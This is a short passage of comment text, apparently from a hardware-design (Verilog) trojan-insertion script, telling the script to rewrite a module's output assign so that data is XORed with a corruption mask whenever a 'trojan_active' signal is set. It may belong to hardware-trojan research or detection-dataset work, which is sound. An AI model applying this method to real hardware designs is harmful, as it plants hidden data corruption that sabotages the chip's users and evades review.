...
//
// IMPORTANT: in_rdata_i may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If in_rdata_i is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for in_rdata_i (or first output assign):
//     assign in_rdata_i = <expr>;
//   Replace with:
//     assign in_rdata_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
